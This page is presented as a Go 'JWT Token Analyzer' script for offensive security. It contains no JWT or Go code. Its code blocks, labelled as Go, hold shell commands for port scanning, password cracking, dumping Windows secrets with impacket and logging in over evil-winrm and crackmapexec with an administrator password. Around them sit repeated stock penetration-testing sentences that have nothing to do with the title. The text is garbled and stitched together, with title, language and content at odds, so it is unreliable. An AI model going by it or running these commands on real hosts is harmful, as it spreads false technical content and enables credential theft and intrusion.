---
TitleSEO: "JWT Token Analyzer in Go | ZureFX"
TitlePost: "JWT Token Analyzer — Go"
Author: "ZureFX"
Description: "A Go script for jwt token analyzer. Built for security research and automation."
Keywords: "script, automation, rust, go"
URL: "https://zurefx.github.io/scripting/script-jwt-token-analyzer-521.html"
URL_IMAGES: ""
Date: "2025-11-14"
Tags: "Script, Automation, Rust, Go"
Section: "scripting"
Lang: "en"
main_img: "script-jwt-token-analyzer-521"
Permalink: "/scripting/script-jwt-token-analyzer-521.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The scheduled task ran with elevated privileges and could be abused for escalation. Authentication bypass was achieved through careful manipulation of the login mechanism. Privilege escalation was possible due to misconfigured sudo permissions.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `kerbrute`
- `lookupsid`
- `feroxbuster`

## Implementation

### Core Logic

The scheduled task ran with elevated privileges and could be abused for escalation. The service was running without proper input validation, leading to injection vulnerabilities.

```go
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p25,636,464 10.88.239.238 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.59.86.104
```

Weak file permissions allowed modification of critical system files. The scheduled task ran with elevated privileges and could be abused for escalation.

### Helper Functions

The target system was identified as running a vulnerable version of the service. The application stored sensitive credentials in an unencrypted configuration file.

```go
impacket-secretsdump administrator:'P@ssw0rd!'@10.60.207.203
nmap -sCV -p995,8888,389 10.104.180.72 -oN scan.txt
nmap -sCV -p5985,3268,9200 10.55.219.244 -oN scan.txt
gobuster dir -u http://10.63.142.121/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

## Usage

### Basic Usage

Network traffic analysis revealed unencrypted communications containing user credentials. The application stored sensitive credentials in an unencrypted configuration file.

```bash
nmap -sCV -p143,27017,636 10.84.186.157 -oN scan.txt
evil-winrm -i 10.47.74.109 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.34.54.222 -u administrator -p 'P@ssw0rd!' --shares
```

### Advanced Options

Command injection was possible through unsanitized user input in the search functionality. The service was running without proper input validation, leading to injection vulnerabilities. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
feroxbuster -h
evil-winrm -i 10.29.236.220 -u administrator -p 'P@ssw0rd!'
```

## Output

### Example Output

The service account had excessive permissions assigned in Active Directory. The database credentials were hardcoded in the application source code.

```
[+] Scanning target...
[+] Found 9 results
[+] Done in 26.15s
```
